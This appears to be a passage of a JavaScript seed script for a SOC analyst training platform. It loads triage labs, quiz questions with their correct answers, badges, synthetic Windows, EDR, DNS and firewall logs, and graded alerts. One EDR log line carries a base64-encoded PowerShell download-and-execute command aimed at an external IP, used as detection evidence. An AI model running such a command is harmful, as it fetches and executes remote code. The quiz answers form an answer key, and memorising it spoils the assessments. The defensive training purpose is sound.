As a **SOC Level 1 (L1) Analyst**, your core mission is alert triaging: separating benign false positives from dangerous true positive incidents and escalating critical threats to L2 / Incident Response teams.

#### Key Terminology:
* **Event**: Any observable occurrence in a system or network (e.g., user logs in, firewall allows packet).
* **Alert**: A notification generated by a detection rule indicating that an event met suspicious criteria.
* **Incident**: An alert confirmed by an analyst to have compromised the confidentiality, integrity, or availability of an asset.

#### The 4-Tier Severity & Priority Matrix:
| Severity | Priority | Description | SLA Target |
| :--- | :--- | :--- | :--- |
| **Critical** | P1 | Active ransomware, Domain Controller compromise, data exfiltration in progress | < 15 minutes |
| **High** | P2 | Single compromised workstation, malware persistence, unauthorized admin login | < 30 minutes |
| **Medium** | P3 | Port scan from external IP, blocked malicious email, brute-force attempt blocked | < 2 hours |
| **Low** | P4 | Policy violation (e.g., unauthorized USB insertion), benign vulnerability scanner | < 24 hours |

#### The SOC L1 Triage Workflow:
\`Alert Received\` -> \`Verify Log Authenticity\` -> \`Extract IOCs (IPs, Hashes, Domains)\` -> \`Correlate with Baseline\` -> \`Classify True Positive vs False Positive\` -> \`Escalate or Close with Notes\`.`,
    JSON.stringify([
      'Not all events are alerts, and not all alerts are incidents.',
      'Severity (Impact) combined with Urgency dictates Priority (P1 through P4).',
      'True Positive: An alert that correctly identifies malicious or unauthorized activity.',
      'False Positive: An alert triggered by benign, normal, or authorized activity.',
      'SOC L1 Analysts must document all triage findings with concrete log evidence.'
    ]),
    `#### Practical Lab Mission:
Review an incoming queue of alerts. Classify each alert by Severity, determine if it is a True Positive or False Positive, and select the proper SLA response priority.`,
    'soc-triage'
  );

  insertLab.run(
    'lab-3',
    3,
    'SOC Alert Queue Triage Simulator',
    `**Mission Objective:**
1. Review the active SOC alert feed.
2. Inspect the alert details using \`alert --info LMCYS-4821\`.
3. Check the affected host criticality and attacker telemetry.
4. Execute \`triage --id LMCYS-4821 --verdict TP --priority P1\` to submit your action.`,
    'terminal',
    JSON.stringify({
      activeAlerts: [
        { id: 'LMCYS-4821', title: 'Multiple Failed RDP Logons Followed by Successful Logon', severity: 'HIGH', host: 'CORP-DC-01', src_ip: '185.220.101.7' },
        { id: 'LMCYS-1044', title: 'Vulnerability Scanner Internal Ping Sweep', severity: 'LOW', host: 'VULN-SCANNER-01', src_ip: '10.0.1.50' }
      ],
      commands: ['help', 'alerts --list', 'alert --info LMCYS-4821', 'alert --info LMCYS-1044', 'triage --id LMCYS-4821 --verdict TP --priority P1']
    }),
    JSON.stringify({
      targetAlert: 'LMCYS-4821',
      correctVerdict: 'TP',
      correctPriority: 'P1'
    })
  );

  insertAssessment.run('asm-3', 3, 70, 600);

  // Questions for Level 3
  const q3_1 = 'q-3-1';
  insertQuestion.run(q3_1, 3, 'mcq', 'What is the primary operational distinction between a Security Alert and a Security Incident?', 'An alert is a triggered detection rule that may or may not be malicious. An incident is a confirmed security breach or policy violation.', 25, 'SOC Fundamentals');
  insertOption.run('opt-3-1-1', q3_1, 'An alert is automatically sent to the CEO; an incident is only seen by the SOC.', 0, 'Executive escalation is reserved for critical incidents.');
  insertOption.run('opt-3-1-2', q3_1, 'An alert is an automated trigger requiring investigation; an incident is a confirmed adverse event that harms an asset.', 1, 'Correct! Alerts require triage before they are declared security incidents.');
  insertOption.run('opt-3-1-3', q3_1, 'Incidents are generated by firewalls; alerts are generated by antivirus.', 0, 'Both systems can generate events, alerts, and incidents.');
  insertOption.run('opt-3-1-4', q3_1, 'There is no distinction; they mean the exact same thing.', 0, 'In SOC operations, their lifecycle and SLA differences are strictly separated.');

  const q3_2 = 'q-3-2';
  insertQuestion.run(q3_2, 3, 'mcq', 'An alert triggers for "Ransomware Encryption Activity Detected on Core Finance Server". What priority and SLA must the SOC L1 assign?', 'Active ransomware on critical enterprise infrastructure is a Priority 1 (Critical) incident with an immediate SLA (under 15 mins).', 25, 'Severity Matrix');
  insertOption.run('opt-3-2-1', q3_2, 'Priority 4 (Low) — Address within 24 hours', 0, 'This would lead to total enterprise loss.');
  insertOption.run('opt-3-2-2', q3_2, 'Priority 3 (Medium) — Address before end of day', 0, 'Ransomware requires immediate containment.');
  insertOption.run('opt-3-2-3', q3_2, 'Priority 1 (Critical) — Immediate escalation and containment (< 15 min SLA)', 1, 'Correct! Active ransomware on core assets is a P1 emergency.');
  insertOption.run('opt-3-2-4', q3_2, 'False Positive — Ignore and close ticket', 0, 'Ransomware signatures on finance servers must never be ignored.');

  const q3_3 = 'q-3-3';
  insertQuestion.run(q3_3, 3, 'mcq', 'What does the term "False Positive" mean in SOC alert triage?', 'A False Positive is an alert triggered by legitimate, benign system activity that mistakenly matched a detection rule.', 25, 'SOC Triage');
  insertOption.run('opt-3-3-1', q3_3, 'An attacker successfully evaded all defenses without raising any alarms.', 0, 'That is a False Negative.');
  insertOption.run('opt-3-3-2', q3_3, 'An alert triggered by normal or authorized activity that posed no threat.', 1, 'Correct! A False Positive is a false alarm generated by benign activity.');
  insertOption.run('opt-3-3-3', q3_3, 'A critical confirmed compromise of the domain controller.', 0, 'That is a True Positive Incident.');
  insertOption.run('opt-3-3-4', q3_3, 'An alert that was deleted by an unauthorized employee.', 0, 'This is log tampering or audit failure.');

  const q3_4 = 'q-3-4';
  insertQuestion.run(q3_4, 3, 'mcq', 'Which role in a SOC is primarily responsible for initial alert triage, IOC extraction, and basic verification?', 'Tier 1 (SOC L1 Analyst) performs frontline monitoring, initial triage, and ticket dispatch.', 25, 'SOC Roles');
  insertOption.run('opt-3-4-1', q3_4, 'SOC Level 1 (L1) Analyst', 1, 'Correct! SOC L1 Analysts are the front line triaging incoming alerts.');
  insertOption.run('opt-3-4-2', q3_4, 'Chief Information Security Officer (CISO)', 0, 'CISO provides executive strategy and budget.');
  insertOption.run('opt-3-4-3', q3_4, 'SOC Level 3 (Threat Hunter / Malware Reverse Engineer)', 0, 'L3 handles deep code analysis and proactive hunting.');
  insertOption.run('opt-3-4-4', q3_4, 'External Legal Counsel', 0, 'Legal advises on compliance and disclosure.');

  // Insert Badges
  const badges = [
    { id: 'badge-1', name: 'Network Rookie', slug: 'network-rookie', description: 'Mastered Level 1: OSI Model & Protocol Triage', icon: 'Network', criteria_type: 'level_complete', threshold_value: 1 },
    { id: 'badge-2', name: 'Windows Explorer', slug: 'windows-explorer', description: 'Mastered Level 2: Windows Event Logs & Event IDs', icon: 'Cpu', criteria_type: 'level_complete', threshold_value: 2 },
    { id: 'badge-3', name: 'Security Defender', slug: 'security-defender', description: 'Mastered Level 3: SOC Operations & Alert Triage', icon: 'Shield', criteria_type: 'level_complete', threshold_value: 3 },
    { id: 'badge-4', name: 'Linux Warrior', slug: 'linux-warrior', description: 'Completed Module 3 Linux Investigation fundamentals', icon: 'Terminal', criteria_type: 'level_complete', threshold_value: 28 },
    { id: 'badge-5', name: 'Log Hunter', slug: 'log-hunter', description: 'Analyzed over 50 synthetic SIEM and EDR log streams', icon: 'Search', criteria_type: 'logs_analyzed', threshold_value: 50 },
    { id: 'badge-6', name: 'Alert Analyst', slug: 'alert-analyst', description: 'Successfully resolved 10 SOC Practical Arena alerts with 100% accuracy', icon: 'Radio', criteria_type: 'alerts_resolved', threshold_value: 10 },
    { id: 'badge-7', name: 'Incident Investigator', slug: 'incident-investigator', description: 'Completed multi-stage incident root cause analysis', icon: 'Crosshair', criteria_type: 'investigations_done', threshold_value: 5 },
    { id: 'badge-8', name: 'Report Master', slug: 'report-master', description: 'Submitted an incident report graded 4.5+ out of 5.0 by the evaluator', icon: 'FileText', criteria_type: 'report_score', threshold_value: 4 },
    { id: 'badge-9', name: 'SOC L1 Ready', slug: 'soc-l1-ready', description: 'Completed Level 100 and achieved full SOC Level 1 readiness certification', icon: 'Award', criteria_type: 'level_complete', threshold_value: 100 }
  ];

  const insertBadge = db.prepare(`INSERT INTO badges (id, name, slug, description, icon, criteria_type, threshold_value) VALUES (?, ?, ?, ?, ?, ?, ?)`);
  badges.forEach(b => insertBadge.run(b.id, b.name, b.slug, b.description, b.icon, b.criteria_type, b.threshold_value));

  // Insert Synthetic Cybersecurity Logs (over 20+ realistic log lines for the SOC Arena)
  const syntheticLogs = [
    { id: 'log-101', category: 'Windows Security', severity: 'HIGH', timestamp: '2026-08-26T03:14:02Z', source_ip: '185.220.101.7', dest_ip: '10.0.0.15', event_id: '4625', hostname: 'CORP-DC-01', username: 'administrator', message: 'An account failed to log on. Reason: Unknown user name or bad password (0xC000006A). LogonType: 10', raw_payload_json: JSON.stringify({ EventID: 4625, TargetUserName: 'administrator', WorkstationName: 'WORKSTATION-X', Status: '0xC000006D', SubStatus: '0xC000006A', IpAddress: '185.220.101.7', IpPort: '51922' }) },
    { id: 'log-102', category: 'Windows Security', severity: 'HIGH', timestamp: '2026-08-26T03:14:05Z', source_ip: '185.220.101.7', dest_ip: '10.0.0.15', event_id: '4625', hostname: 'CORP-DC-01', username: 'administrator', message: 'An account failed to log on. Reason: Unknown user name or bad password (0xC000006A). LogonType: 10', raw_payload_json: JSON.stringify({ EventID: 4625, TargetUserName: 'administrator', Status: '0xC000006D', SubStatus: '0xC000006A', IpAddress: '185.220.101.7', IpPort: '51924' }) },
    { id: 'log-103', category: 'Windows Security', severity: 'HIGH', timestamp: '2026-08-26T03:14:08Z', source_ip: '185.220.101.7', dest_ip: '10.0.0.15', event_id: '4625', hostname: 'CORP-DC-01', username: 'administrator', message: 'An account failed to log on. Reason: Unknown user name or bad password (0xC000006A). LogonType: 10', raw_payload_json: JSON.stringify({ EventID: 4625, TargetUserName: 'administrator', Status: '0xC000006D', SubStatus: '0xC000006A', IpAddress: '185.220.101.7', IpPort: '51928' }) },
    { id: 'log-104', category: 'Windows Security', severity: 'HIGH', timestamp: '2026-08-26T03:14:12Z', source_ip: '185.220.101.7', dest_ip: '10.0.0.15', event_id: '4625', hostname: 'CORP-DC-01', username: 'administrator', message: 'An account failed to log on. Reason: Unknown user name or bad password (0xC000006A). LogonType: 10', raw_payload_json: JSON.stringify({ EventID: 4625, TargetUserName: 'administrator', Status: '0xC000006D', SubStatus: '0xC000006A', IpAddress: '185.220.101.7', IpPort: '51931' }) },
    { id: 'log-105', category: 'Windows Security', severity: 'CRITICAL', timestamp: '2026-08-26T03:14:18Z', source_ip: '185.220.101.7', dest_ip: '10.0.0.15', event_id: '4624', hostname: 'CORP-DC-01', username: 'administrator', message: 'An account was successfully logged on. LogonType: 10 (RemoteInteractive/RDP). Elevated Token: YES', raw_payload_json: JSON.stringify({ EventID: 4624, TargetUserName: 'administrator', TargetDomainName: 'CONTOSO', LogonType: 10, IpAddress: '185.220.101.7', AuthenticationPackage: 'Negotiate' }) },
    { id: 'log-106', category: 'EDR', severity: 'CRITICAL', timestamp: '2026-08-26T03:14:35Z', source_ip: '10.0.0.15', dest_ip: '185.220.101.7', event_id: '4688', hostname: 'CORP-DC-01', username: 'administrator', message: 'Process created: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANwAvAHIAZQBlAC4AcABzADEAJwApAA==', raw_payload_json: JSON.stringify({ ParentProcess: 'cmd.exe', ProcessCommandLine: 'powershell.exe -enc ...', SHA256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }) },
    { id: 'log-107', category: 'Firewall', severity: 'MEDIUM', timestamp: '2026-08-26T03:15:00Z', source_ip: '185.220.101.7', dest_ip: '10.0.0.15', event_id: 'FW-ALLOW-3389', hostname: 'PALO-ALTO-EDGE', username: 'N/A', message: 'ALLOW TCP 185.220.101.7:51922 -> 10.0.0.15:3389 (MS-RDP)', raw_payload_json: JSON.stringify({ Action: 'ALLOW', Protocol: 'TCP', Application: 'ms-rdp', BytesSent: 14820, BytesReceived: 62410 }) },
    { id: 'log-108', category: 'DNS', severity: 'HIGH', timestamp: '2026-08-26T03:16:10Z', source_ip: '10.0.0.15', dest_ip: '8.8.8.8', event_id: 'DNS-QUERY', hostname: 'CORP-DC-01', username: 'SYSTEM', message: 'DNS Query for c2-beacon.darkops-gateway.xyz TYPE A (Response: 185.220.101.7)', raw_payload_json: JSON.stringify({ QueryDomain: 'c2-beacon.darkops-gateway.xyz', QueryType: 'A', ResponseIP: '185.220.101.7' }) },
    { id: 'log-109', category: 'Linux auth', severity: 'LOW', timestamp: '2026-08-26T03:20:00Z', source_ip: '10.0.1.50', dest_ip: '10.0.1.200', event_id: 'SSHD-AUTH', hostname: 'UBUNTU-PROD-APP', username: 'backup_svc', message: 'Accepted publickey for backup_svc from 10.0.1.50 port 44820 ssh2', raw_payload_json: JSON.stringify({ Hostname: 'UBUNTU-PROD-APP', Process: 'sshd[4102]', Msg: 'Accepted publickey' }) },
    { id: 'log-110', category: 'Windows Security', severity: 'LOW', timestamp: '2026-08-26T03:22:15Z', source_ip: '10.0.1.50', dest_ip: '10.0.0.15', event_id: '4624', hostname: 'CORP-DC-01', username: 'nessus_scanner', message: 'An account was successfully logged on. LogonType: 3 (Network). Scheduled Nessus audit scan.', raw_payload_json: JSON.stringify({ EventID: 4624, TargetUserName: 'nessus_scanner', LogonType: 3, IpAddress: '10.0.1.50' }) }
  ];

  const insertLog = db.prepare(`INSERT INTO logs (id, category, severity, timestamp, source_ip, dest_ip, event_id, hostname, username, message, raw_payload_json) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
  syntheticLogs.forEach(l => insertLog.run(l.id, l.category, l.severity, l.timestamp, l.source_ip, l.dest_ip, l.event_id, l.hostname, l.username, l.message, l.raw_payload_json));

  // Insert Benchmark Synthetic Alerts for SOC Arena
  const insertAlert = db.prepare(`INSERT INTO alerts (id, alert_code, title, severity, category, source_ip, dest_ip, description, expected_decision, mitre_technique, attack_narrative, evidence_required_json, hints_json, concept_explanation_md) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);

  insertAlert.run(
    'alt-4821',
    'LMCYS-4821',
    'Multiple RDP Logon Failures Followed by Elevated Logon (Event 4625 -> 4624)',
    'HIGH',
    'Windows Security / Authentication',
    '185.220.101.7',
    '10.0.0.15',
    'The SIEM correlation rule "Auth-BruteForce-Success" detected 4 failed logon attempts (Event ID 4625) within 15 seconds from external IP 185.220.101.7 against Administrator on CORP-DC-01, followed immediately by a successful RDP logon (Event ID 4624, LogonType 10).',
    'True Positive',
    'T1110.001 (Brute Force: Password Guessing) / T1078.002 (Valid Accounts: Domain Accounts)',
    'An external attacker conducted a rapid automated password guessing attack over open port 3389 (RDP). The attacker successfully discovered the administrator credentials and established an interactive remote session, immediately launching an encoded PowerShell download command.',
    JSON.stringify(['Event ID 4625 x 4', 'Event ID 4624 LogonType 10', 'Source IP 185.220.101.7', 'Encoded PowerShell execution Event ID 4688']),
    JSON.stringify([
      'Hint 1: Check the sequence of events from the same source IP 185.220.101.7 in the log viewer.',
      'Hint 2: Notice that Event ID 4625 occurs repeatedly, followed shortly by Event ID 4624 with Logon Type 10 (Remote Desktop).',
      'Hint 3: Examine the subsequent Event ID 4688 log where powershell.exe runs an encoded download string.'
    ]),
    `### Concept Explanation: Brute Force & Credential Compromise
When an external adversary targets an exposed remote management service (such as RDP on port 3389), they generate multiple **Event ID 4625** (failed logons) with status code \`0xC000006A\` (bad password). 

Once the correct password is tried, Windows generates **Event ID 4624** with **LogonType 10** (RemoteInteractive). Because this was preceded by brute force and immediately executed an encoded command, this is a **True Positive (Critical Severity Incident)** requiring immediate host isolation and credential revocation.`
  );

  insertAlert.run(
    'alt-1044',
    'LMCYS-1044',
    'Internal Vulnerability Scanner High-Volume Port Scan & Login Attempt',
    'LOW',
    'Network / Vulnerability Assessment',
    '10.0.1.50',
    '10.0.0.15',
    'SIEM rule "Port-Scan-Internal" detected IP 10.0.1.50 probing ports 21, 22, 80, 443, 3389, and attempting login with account "nessus_scanner".',
    'False Positive',
    'T1046 (Network Service Discovery)',
    'The security team runs an authorized weekly Nessus vulnerability assessment scan from internal host 10.0.1.50 according to scheduled change request CR-2026-881.',
    JSON.stringify(['Source IP 10.0.1.50 matches approved scanner', 'Target account nessus_scanner', 'Scheduled Change window CR-2026-881']),
    JSON.stringify([
      'Hint 1: Check the source IP 10.0.1.50 and the targeted username "nessus_scanner".',
      'Hint 2: Verify whether internal vulnerability scanning is an authorized corporate routine.'
    ]),
    `### Concept Explanation: Benign Vulnerability Scanners
Enterprise vulnerability scanners (like Tenable Nessus, Qualys, or Rapid7) generate port scans and authentication checks. In a SOC, analysts must verify against the **Change Management Schedule** and authorized scanner IP list. Since this matched the authorized scanner and dedicated scan credential, this is a **False Positive** (Authorized Routine).`
  );

  // Mark Level 1 user progress for demo user
  db.prepare(`INSERT INTO user_progress (id, user_id, level_id, status, highest_score) VALUES 
    ('prog-demo-1', 'usr-demo-01', 1, 'current', 0.0),
    ('prog-demo-2', 'usr-demo-01', 2, 'locked', 0.0),
    ('prog-demo-3', 'usr-demo-01', 3, 'locked', 0.0)
  `).run();

  console.log('✅ LMCYS database initialized and seeded successfully!');
}
